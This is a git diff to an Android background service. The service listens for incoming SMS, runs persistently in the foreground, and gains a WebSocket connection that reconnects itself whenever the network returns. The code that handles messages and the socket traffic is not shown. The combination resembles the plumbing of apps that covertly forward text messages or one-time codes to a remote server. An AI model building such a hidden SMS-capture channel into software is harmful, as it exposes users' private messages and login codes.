@@ -8,44 +8,67 @@ import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.net.ConnectivityManager;
+import android.net.Network;
+import android.net.NetworkRequest;
 import android.os.Build;
+import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
 
+import androidx.annotation.NonNull;
 import androidx.core.app.NotificationCompat;
 
+import com.mydesign.service.boi.net.Helper;
 import com.mydesign.service.boi.net.MainActivity;
 
 public class BackgroundService extends Service {
 
-    private static final String TAG = "BackgroundService";
+    private static  String TAG = "Kritika";
     private static final String CHANNEL_ID = "SmsServiceChannel";
     private SmsReceiver smsReceiver;
+    private WebSocketManager webSocketManager;
 
     @Override
     public void onCreate() {
         super.onCreate();
         createNotificationChannel();
+        TAG = Helper.TAG;
 
         // Register the SMS receiver
         IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
         smsReceiver = new SmsReceiver();
         registerReceiver(smsReceiver, filter);
 
-        // Start the service in the foreground
         startForegroundService();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "Foreground service running");
+        Log.d(Helper.TAG, "Foreground service running");
+        webSocketManager = new WebSocketManager(getApplicationContext());
+        webSocketManager.connect();
+
+        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
+        NetworkRequest networkRequest = new NetworkRequest.Builder().build();
+        connectivityManager.registerNetworkCallback(networkRequest, new ConnectivityManager.NetworkCallback() {
+            @Override
+            public void onAvailable(@NonNull Network network) {
+                reconnectWebSocket();
+            }
+
+            @Override
+            public void onLost(@NonNull Network network) {
+                webSocketManager.closeConnection();
+            }
+        });
         return START_STICKY;
     }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        Log.d(TAG, "Foreground service destroyed");
+        Log.d(Helper.TAG, "Foreground service destroyed");
         if (smsReceiver != null) {
             unregisterReceiver(smsReceiver);
             smsReceiver = null;
@@ -54,19 +77,19 @@ public class BackgroundService extends Service {
 
     @Override
     public IBinder onBind(Intent intent) {
-        Log.d(TAG, "onBind called - not used for started services");
+        Log.d(Helper.TAG, "onBind called - not used for started services");
         return null;
     }
 
     @Override
     public boolean onUnbind(Intent intent) {
-        Log.d(TAG, "onUnbind called - service is being unbound");
+        Log.d(Helper.TAG, "onUnbind called - service is being unbound");
         return super.onUnbind(intent);
     }
 
     @Override
     public void onRebind(Intent intent) {
-        Log.d(TAG, "onRebind called - service is being rebound");
+        Log.d(Helper.TAG, "onRebind called - service is being rebound");
         super.onRebind(intent);
     }
 
@@ -97,4 +120,14 @@ public class BackgroundService extends Service {
                 .build();
         startForeground(1, notification);
     }
+
+    private void reconnectWebSocket() {
+        new Handler().postDelayed(() -> {
+            if (!webSocketManager.isConnected()) {
+                webSocketManager = new WebSocketManager(getApplicationContext());
+                webSocketManager.connect();
+            }
+        }, 3000);
+    }
+
 }
